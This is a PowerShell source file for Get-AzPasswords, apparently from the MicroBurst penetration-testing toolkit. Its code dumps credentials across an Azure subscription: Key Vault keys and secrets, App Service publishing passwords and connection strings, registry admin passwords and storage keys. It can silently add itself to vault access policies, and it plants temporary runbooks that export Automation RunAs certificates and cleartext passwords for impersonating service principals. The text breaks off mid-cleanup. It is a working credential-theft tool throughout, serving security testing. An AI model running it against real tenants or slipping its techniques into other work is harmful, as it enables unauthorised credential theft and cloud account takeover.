﻿<#
    File: Get-AzPasswords.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2020
    Description: PowerShell function for dumping Azure credentials using the Az PowerShell CMDlets.
#>


# Check if the Az Module is installed and imported
if(!(Get-Module Az)){
    try{Import-Module Az -ErrorAction Stop}
    catch{Install-Module -Name Az -Confirm}
    }


Function Get-AzPasswords
{
<#

    .SYNOPSIS
        Dumps all available credentials from an Azure subscription. Pipe to Out-Gridview or Export-CSV for easier parsing.
    .DESCRIPTION
        This function will look for any available credentials and certificates store in Key Vaults, App Services Configurations, and Automation accounts. 
        If the Azure management account has permissions, it will read the values directly out of the Key Vaults and App Services Configs.
        A runbook will be spun up for dumping automation account credentials, so it will create a log entry in the automation jobs.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER ExportCerts
        Flag for saving private certs locally.           
    .EXAMPLE
        PS C:\MicroBurst> Get-AzPasswords -Verbose | Out-GridView
        VERBOSE: Logged In as testaccount@example.com
        VERBOSE: Getting List of Key Vaults...
        VERBOSE: 	Exporting items from example-private
        VERBOSE: 	Exporting items from PasswordStore
        VERBOSE: 		Getting Key value for the example-Test Key
        VERBOSE: 		Getting Key value for the RSA-KEY-1 Key
        VERBOSE: 		Getting Key value for the TestCertificate Key
        VERBOSE: 		Getting Secret value for the example-Test Secret
        VERBOSE: 			Unable to export Secret value for example-Test
        VERBOSE: 		Getting Secret value for the SuperSecretPassword Secret
        VERBOSE: 		Getting Secret value for the TestCertificate Secret
        VERBOSE: Getting List of Azure App Services...
        VERBOSE: 	Profile available for example1
        VERBOSE: 	Profile available for example2
        VERBOSE: 	Profile available for example3
        VERBOSE: Getting List of Azure Automation Accounts...
        VERBOSE: 	Getting credentials for testAccount using the lGVeLPZARrTJdDu.ps1 Runbook
        VERBOSE: 		Waiting for the automation job to complete
        VERBOSE: Password Dumping Activities Have Completed

    .LINK
    https://blog.netspi.com/get-azurepasswords
    https://blog.netspi.com/exporting-azure-runas-certificates
#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",
        
        [parameter(Mandatory=$false,
        HelpMessage="Dump Key Vault Keys.")]
        [ValidateSet("Y","N")]
        [String]$Keys = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Add list and get rights for your user in the vault access policies.")]
        [ValidateSet("Y","N")]
        [String]$ModifyPolicies = "N",

        [parameter(Mandatory=$false,
        HelpMessage="Dump App Services Configurations.")]
        [ValidateSet("Y","N")]
        [String]$AppServices = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump Azure Container Registry Admin passwords.")]
        [ValidateSet("Y","N")]
        [String]$ACR = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump Storage Account Keys.")]
        [ValidateSet("Y","N")]
        [String]$StorageAccounts = "Y",
                
        [parameter(Mandatory=$false,
        HelpMessage="Dump Automation Accounts.")]
        [ValidateSet("Y","N")]
        [String]$AutomationAccounts = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Password to use for exporting the Automation certificates.")]
        [String]$CertificatePassword = "TotallyNotaHardcodedPassword...",

        [parameter(Mandatory=$false,
        HelpMessage="Dump keys for CosmosDB Accounts.")]
        [ValidateSet("Y","N")]
        [String]$CosmosDB = "Y",

        [Parameter(Mandatory=$false,
        HelpMessage="Export the Key Vault certificates to local files.")]
        [ValidateSet("Y","N")]
        [string]$ExportCerts = "N"

    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
    

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzPasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword -ACR $ACR -StorageAccounts $StorageAccounts -ModifyPolicies $ModifyPolicies -CosmosDB $CosmosDB}
        break
    }

    Write-Verbose "Logged In as $accountName"

    # Create data table to house results
    $TempTblCreds = New-Object System.Data.DataTable 
    $TempTblCreds.Columns.Add("Type") | Out-Null
    $TempTblCreds.Columns.Add("Name") | Out-Null
    $TempTblCreds.Columns.Add("Username") | Out-Null
    $TempTblCreds.Columns.Add("Value") | Out-Null
    $TempTblCreds.Columns.Add("PublishURL") | Out-Null
    $TempTblCreds.Columns.Add("Created") | Out-Null
    $TempTblCreds.Columns.Add("Updated") | Out-Null
    $TempTblCreds.Columns.Add("Enabled") | Out-Null
    $TempTblCreds.Columns.Add("Content Type") | Out-Null
    $TempTblCreds.Columns.Add("Vault") | Out-Null
    $TempTblCreds.Columns.Add("Subscription") | Out-Null


    $subName = (Get-AzSubscription -SubscriptionId $Subscription).Name

    if($Keys -eq 'Y'){
        # Key Vault Section
        $vaults = Get-AzKeyVault
        Write-Verbose "Getting List of Key Vaults..."
    
        foreach ($vault in $vaults){
            $vaultName = $vault.VaultName

            Write-Verbose "Starting on the $vaultName Key Vault"

            # Check list and read on the vault, add it if not there
            if($ModifyPolicies -eq 'Y'){

                $currentVault = Get-AzKeyVault -VaultName $vaultName

                # Pulls current user ObjectID from LoginStatus
                $currentOID = ($LoginStatus.Account.ExtendedProperties.HomeAccountId).split('.')[0]
                                
                # Base variable for reverting policies
                $needsKeyRevert = $false
                $needsSecretRevert = $false
                $needsCleanup = $false

                # If the OID is in the policies already, check if list/read available
                if($currentVault.AccessPolicies.ObjectID -contains $currentOID){

                    Write-Verbose "`tCurrent user has an existing access policy on the $vaultName vault"
                    $userPolicy = ($currentVault.AccessPolicies | where ObjectID -Match $currentOID)

                    # use the $userPolicy.PermissionsToKeys (non-str) to reset perms

                    $keyPolicyStr = $userPolicy.PermissionsToKeysStr
                    $secretPolicyStr = $userPolicy.PermissionsToSecretsStr
                    $certPolicyStr = $userPolicy.PermissionsToCertificatesStr
                                        
                    #======================Keys======================
                    # If not get, and not list try to add get and list
                    if((!($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
                        # Take Existing, append Get and List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"

                        Write-Verbose "`t`tTrying to add Keys get/list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy

                        # flag the need for clean up
                        $needsKeyRevert = $true
                    }
                    # If not get, and list, then try to add get
                    elseif((!($keyPolicyStr -match "Get")) -and (($keyPolicyStr -match "List"))){
                        # Take Existing, append Get
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"Get"
                        
                        Write-Verbose "`t`tTrying to add Keys get access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy

                        # flag the need for clean up
                        $needsKeyRevert = $true

                    }
                    # If get, and not list, try to add list
                    elseif((($keyPolicyStr -match "Get")) -and (!($keyPolicyStr -match "List"))){
                        # Take Existing, append List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToKeys)+"List"

                        Write-Verbose "`t`tTrying to add Keys list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $updatedKeyPolicy
                        
                        # flag the need for clean up
                        $needsKeyRevert = $true
                    }
                    else{Write-Verbose "`tCurrent user has Keys get/list access to the $vaultName vault"}

                    #======================Secrets======================

                    # If not get, and not list try to add get and list
                    if((!($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
                        # Take Existing, append Get and List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"

                        Write-Verbose "`t`tTrying to add Secrets get/list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy

                        # flag the need for clean up
                        $needsSecretRevert = $true
                    }
                    # If not get, and list, then try to add get
                    elseif((!($secretPolicyStr -match "Get")) -and (($secretPolicyStr -match "List"))){
                        # Take Existing, append Get
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"Get"
                        
                        Write-Verbose "`t`tTrying to add Secrets get access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy

                        # flag the need for clean up
                        $needsSecretRevert = $true

                    }
                    # If get, and not list, try to add list
                    elseif((($secretPolicyStr -match "Get")) -and (!($secretPolicyStr -match "List"))){
                        # Take Existing, append List
                        $updatedKeyPolicy = ($userPolicy.PermissionsToSecrets)+"List"

                        Write-Verbose "`t`tTrying to add Secrets list access for current user"
                        Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $updatedKeyPolicy
                        
                        # flag the need for clean up
                        $needsSecretRevert = $true
                    }
                    else{Write-Verbose "`tCurrent user has Secrets get/list access in the to the $vaultName vault"}
                }
                                
                # Else, just add new rights
                else{
                    Write-Verbose "`tCurrent user does not have an access policy entry in the $vaultName vault, adding get/list rights"

                    # Add the read rights here
                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys get,list -PermissionsToSecrets get,list -PermissionsToCertificates get,list

                    # flag the need for clean up
                    $needsCleanup = $true
                }
            }


            try{
                $keylist = Get-AzKeyVaultKey -VaultName $vaultName -ErrorAction Stop
                                
                # Dump Keys
                Write-Verbose "`tExporting items from $vaultName"
                foreach ($key in $keylist){
                    $keyname = $key.Name
                    Write-Verbose "`t`tGetting Key value for the $keyname Key"
                    try{
                        $keyValue = Get-AzKeyVaultKey -VaultName $vault.VaultName -Name $key.Name -ErrorAction Stop
            
                        # Add Key to the table
                        $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
                    }
                    catch{Write-Verbose "`t`t`tUnable to access the $keyname key"}

                }
            }
            # KVs that have Networking policies will fail, so clean up policies here
            catch{
                Write-Verbose "`t`tUnable to access the keys for the $vaultName key vault"
                # If key policies were changed, Revert them
                if($needsKeyRevert){
                    Write-Verbose "`t`tReverting the Key Access Policies for the current user on the $vaultName vault"
                    # Revert the Keys, Secrets, and Certs policies
                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $userPolicy.PermissionsToKeys
                }
                # If secrets policies were changed, Revert them
                if($needsSecretRevert){
                    Write-Verbose "`t`tReverting the Secrets Access Policies for the current user on the $vaultName vault"
                    # Revert the Secrets policy
                    Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $userPolicy.PermissionsToSecrets
                }
                # If Access Policy was added for your user, remove it
                if($needsCleanup){
                    Write-Verbose "`t`tRemoving current user from the Access Policies for the $vaultName vault"
                    # Delete the user from the Access Policies
                    Remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID
                }
            }

            # Dump Secrets
            try{$secrets = Get-AzKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
            catch{Write-Verbose "`t`tUnable to access secrets for the $vaultName key vault"; Continue}

            foreach ($secret in $secrets){
                $secretname = $secret.Name
                Write-Verbose "`t`tGetting Secret value for the $secretname Secret"
                Try{
                    $secretValue = Get-AzKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop

                    $secretType = $secretValue.ContentType

                    # Write Private Certs to file
                    if (($ExportCerts -eq "Y") -and ($secretType  -eq "application/x-pkcs12")){
                            Write-Verbose "`t`t`tWriting certificate for $secretname to $pwd\$secretname.pfx"
                            $secretBytes = [convert]::FromBase64String($secretValue.SecretValueText)
                            [IO.File]::WriteAllBytes("$pwd\$secretname.pfx", $secretBytes)
                        }

                    # Fix implemented from here - https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-powershell
                    $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secretValue.SecretValue)
                    try {
                       $secretValueText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
                    } 
                    finally {
                       [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
                    }

                    # Add Secret to the table
                    $TempTblCreds.Rows.Add("Secret",$secretValue.Name,"N/A",$secretValueText,"N/A",$secretValue.Created,$secretValue.Updated,$secretValue.Enabled,$secretValue.ContentType,$vault.VaultName,$subName) | Out-Null
                }
                Catch{Write-Verbose "`t`t`tUnable to export Secret value for $secretname"}
            }

            # If key policies were changed, Revert them
            if($needsKeyRevert){
                Write-Verbose "`tReverting the Key Access Policies for the current user on the $vaultName vault"
                # Revert the Keys, Secrets, and Certs policies
                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToKeys $userPolicy.PermissionsToKeys
            }

            # If secrets policies were changed, Revert them
            if($needsSecretRevert){
                Write-Verbose "`tReverting the Secrets Access Policies for the current user on the $vaultName vault"
                # Revert the Secrets policy
                Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID -PermissionsToSecrets $userPolicy.PermissionsToSecrets
            }

            # If Access Policy was added for your user, remove it
            if($needsCleanup){
                Write-Verbose "`tRemoving current user from the Access Policies for the $vaultName vault"
                # Delete the user from the Access Policies
                Remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ObjectId $currentOID
            }
        }
    }

    if($AppServices -eq 'Y'){
        # App Services Section
        Write-Verbose "Getting List of Azure App Services..."

        # Read App Services configs
        $appServs = Get-AzWebApp
        $appServs | ForEach-Object{
            $appServiceName = $_.Name
            $resourceGroupName = Get-AzResource -ResourceId $_.Id | select ResourceGroupName

            # Get each config 
            try{
                [xml]$configFile = Get-AzWebAppPublishingProfile -ResourceGroup $resourceGroupName.ResourceGroupName -Name $_.Name -ErrorAction Stop
            
                if ($configFile){
                    foreach ($profile in $configFile.publishData.publishProfile){
                        # Read Deployment Passwords and add to the output table
                        $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName,$profile.userName,$profile.userPWD,$profile.publishUrl,"N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                    
                        # Parse Connection Strings                    
                        if ($profile.SQLServerDBConnectionString){
                            $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.SQLServerDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                        }
                        if ($profile.mySQLDBConnectionString){
                            $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.mySQLDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                        }
                    }
                    # Grab additional custom connection strings
                    $resourceName = $_.Name+"/connectionstrings"
                    $resource = Invoke-AzResourceAction -ResourceGroupName $_.ResourceGroup -ResourceType Microsoft.Web/sites/config -ResourceName $resourceName -Action list -ApiVersion 2015-08-01 -Force
                    $propName = $resource.properties | gm -M NoteProperty | select name
                    if($resource.Properties.($propName.Name).type -eq 3){$TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+"-Custom-ConnectionString","N/A",$resource.Properties.($propName.Name).value,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null}
                }
                Write-Verbose "`tProfile available for $appServiceName"
            }
            catch{Write-Verbose "`tNo profile available for $appServiceName"}
        }
    }

    if ($ACR -eq 'Y'){
        # Container Registry Section
        Write-Verbose "Getting List of Azure Container Registries..."
        $registries = Get-AzContainerRegistry
        $registries | ForEach-Object {
            if ($_.AdminUserEnabled -eq 'True'){
                
                $loginServer = $_.LoginServer
                Write-Verbose "`tGetting the Admin User password for $loginServer"
                $ACRpasswords = Get-AzContainerRegistryCredential -ResourceGroupName $_.ResourceGroupName -Name $_.Name
                $TempTblCreds.Rows.Add("ACR-AdminUser",$_.LoginServer,$ACRpasswords.Username,$ACRpasswords.Password,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                $TempTblCreds.Rows.Add("ACR-AdminUser",$_.LoginServer,$ACRpasswords.Username,$ACRpasswords.Password2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
            }
        }
    }

    if($StorageAccounts -eq 'Y'){
        # Storage Account Section
        Write-Verbose "Getting List of Storage Accounts..."
        $storageAccountList = Get-AzStorageAccount
        $storageAccountList | ForEach-Object {
            $saName = $_.StorageAccountName
            Write-Verbose "`tGetting the Storage Account keys for the $saName account"
            $saKeys = Get-AzStorageAccountKey -ResourceGroupName $_.ResourceGroupName -Name $_.StorageAccountName
            $saKeys | ForEach-Object{
                $TempTblCreds.Rows.Add("Storage Account",$saName,$_.KeyName,$_.Value,"N/A","N/A","N/A","N/A","Key","N/A",$subName) | Out-Null
            }
        }
    }

    if ($AutomationAccounts -eq 'Y'){
        # Automation Accounts Section
        $AutoAccounts = Get-AzAutomationAccount
        Write-Verbose "Getting List of Azure Automation Accounts..."


        # Get Cert path from 
        $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst

        if ($cert -eq $null){
            # Create new Cert
            New-SelfSignedCertificate -DnsName microburst -CertStoreLocation "Cert:\CurrentUser\My" -KeyUsage KeyEncipherment,DataEncipherment, KeyAgreement -Type DocumentEncryptionCert | Out-Null

            # Get Cert path from 
            $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst
        }

        # Export to cer
        Export-Certificate -Cert $cert -FilePath .\microburst.cer | Out-Null

        # Cast Cert file to B64
        $ENCbase64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(-join($pwd,"\microburst.cer")))


        foreach ($AutoAccount in $AutoAccounts){

            $verboseName = $AutoAccount.AutomationAccountName

            # Check for Automation Account Stored Credentials
            $autoCred = (Get-AzAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName).Name

            # Check for Automation Account Connections
            $autoConnections = Get-AzAutomationConnection -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName
            
            # Clear out jobList variable
            $jobList = $null

            # For each connection, create a runbook for exporting the connection cert
            $autoConnections | ForEach-Object{
                $autoConnectionName = $_.Name

                # Make the call again with the specific Connection name
                $detailAutoConnection = Get-AzAutomationConnection -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Name $autoConnectionName
                
                # Parse values
                $autoConnectionThumbprint = $detailAutoConnection.FieldDefinitionValues.CertificateThumbprint
                $autoConnectionTenantId = $detailAutoConnection.FieldDefinitionValues.TenantId
                $autoConnectionApplicationId = $detailAutoConnection.FieldDefinitionValues.ApplicationId

                # Get the actual cert name to pass into the runbook
                $runbookCert = Get-AzAutomationCertificate -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | where Thumbprint -EQ $autoConnectionThumbprint
                $runbookCertName = $runbookCert.Name

                # Set Random names for the runbooks. Prevents conflict issues
                $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
                                
                    # Set the runbook to export the runas certificate and write Script to local file
                    "`$RunAsCert = Get-AutomationCertificate -Name '$runbookCertName'" | Out-File -FilePath "$pwd\$jobName.ps1" 
                    "`$CertificatePath = Join-Path `$env:temp $verboseName-AzureRunAsCertificate.pfx" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                    "`$Cert = `$RunAsCert.Export('pfx','$CertificatePassword')" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                    "Set-Content -Value `$Cert -Path `$CertificatePath -Force -Encoding Byte | Write-Verbose " | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        
                    # Cast to Base64 string in Automation, write it to output
                    "`$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(`$CertificatePath))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

                    # Copy the B64 encryption cert to the Automation Account host
                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                    "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                    "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

                    # Encrypt the passwords in the Automation account output
                    "`$encryptedOut = (`$base64string | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

                    # Write the output to the log
                    "write-output `$encryptedOut" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        
               
                # Cast Name for runas scripts for each connection                
                $runAsName = -join($verboseName,'-',$autoConnectionName)

                    "`$thumbprint = '$autoConnectionThumbprint'"| Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1"
                    "`$tenantID = '$autoConnectionTenantId'" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append                                               
                    "`$appId = '$autoConnectionApplicationId'" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append

                    "`$SecureCertificatePassword = ConvertTo-SecureString -String $CertificatePassword -AsPlainText -Force" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
                    "Import-PfxCertificate -FilePath .\$runAsName-AzureRunAsCertificate.pfx -CertStoreLocation Cert:\LocalMachine\My -Password `$SecureCertificatePassword" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
                    "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append

                if($jobList){
                    $jobList += @(@($jobName,$runAsName))
                }
                else{
                    $jobList = @(@($jobName,$runAsName))
                }
            }



            # If other creds are available, get the credentials from the runbook
            if ($autoCred -ne $null){
                # foreach credential in autocred, create a new file, add the name to the list
                foreach ($subCred in $autoCred){
                    # Set Random names for the runbooks. Prevents conflict issues
                    $jobName2 = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                    # Write Script to local file
                    "`$myCredential = Get-AutomationPSCredential -Name '$subCred'" | Out-File -FilePath "$pwd\$jobName2.ps1" 
                    "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    # Copy the B64 encryption cert to the Automation Account host
                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    # Encrypt the passwords in the Automation account output
                    "`$encryptedOut1 = (`$userName | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "`$encryptedOut2 = (`$password | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    # Write the output to the log
                    "write-output `$encryptedOut1" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "write-output `$encryptedOut2" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    $jobList2 += @($jobName2)
                }
            }                               

#============================== End Automation Script Creation ==============================#

#============================ Start Automation Script Execution =============================#
            # No creds handle
            if (($autoCred -eq $null) -and ($jobList -eq $null)){Write-Verbose "No Connections or Credentials configured for $verboseName Automation Account"}

            # If there's no connection jobs, don't run any
            if ($jobList.Count -ne $null){
                $connectionIter = 0
                while ($connectionIter -lt ($jobList.Count)){
                    $jobName = $jobList[$connectionIter]
                    $runAsName = $jobList[$connectionIter+1]

                    Write-Verbose "`tGetting the RunAs certificate for $verboseName using the $jobName.ps1 Runbook"
                    try{
                        Import-AzAutomationRunbook -Path $pwd\$jobName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName | Out-Null

                        # Publish the runbook
                        Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName | Out-Null

                        # Run the runbook and get the job id
                        $jobID = Start-AzAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                        # Wait for the job to complete
                        Write-Verbose "`t`tWaiting for the automation job to complete"
                        while($jobstatus.Status -ne "Completed"){
                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                        }    

                        $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
                          
                        # if execution errors, delete the AuthenticateAs- ps1 file
                        if($jobOutput.Exception){
                            Write-Verbose "`t`tNo available certificate for the connection"
                            Remove-Item -Path (Join-Path $pwd "AuthenticateAs-$runAsName.ps1") | Out-Null                            
                        }
                        # Else write it to a local file
                        else{

                            $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
                            # Decrypt the output and write the pfx file
                            [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobOutput.Values | Unprotect-CmsMessage)))

                            $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
                            Write-Verbose $instructionsMSG                        
                        }

                        # clean up
                        Write-Verbose "`t`tRemoving $jobName runbook from $verboseName Automation Account"
                        Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                    }
                    Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}

                    # Clean up local temp files
                    Remove-Item -Path $pwd\$jobName.ps1 | Out-Null

                    $connectionIter += 2
                }
            }
            
            # If there's cleartext credentials, run the second runbook
            if ($autoCred -ne $null){
                $autoCredIter = 0   
                Write-Verbose "`tGetting cleartext credentials for the $verboseName Automation Account"
                foreach ($jobToRun in $jobList2){
                    # If the additional runbooks didn't write, don't run them
                    if (Test-Path $pwd\$jobToRun.ps1 -PathType Leaf){
                        $autoCredCurrent = $autoCred[$autoCredIter]
                        Write-Verbose "`t`tGetting cleartext credentials for $autoCredCurrent using the $jobToRun.ps1 Runbook"
                        $autoCredIter++
                        try{
                            Import-AzAutomationRunbook -Path $pwd\$jobToRun.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRun | Out-Null

                            # publish the runbook
                            Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null

                            # run the runbook and get the job id
                            $jobID = Start-AzAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                            # Wait for the job to complete
                            Write-Verbose "`t`t`tWaiting for the automation job to complete"
                            while($jobstatus.Status -ne "Completed"){
                                $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                            }    

                            # If there was an actual cred here, get the output and add it to the table                    
                            try{
                                # Get the output
                                $jobOutput = (Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value)
                                
                                # Might be able to delete this line...
                                if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
        
                                # Decrypt the output and add it to the table
                                $cred1 = ($jobOutput[0].value | Unprotect-CmsMessage)
                                $cred2 = ($jobOutput[1].value | Unprotect-CmsMessage)
                                $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                            }
                            catch {}

                            # clean up
                            Write-Verbose "`t`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
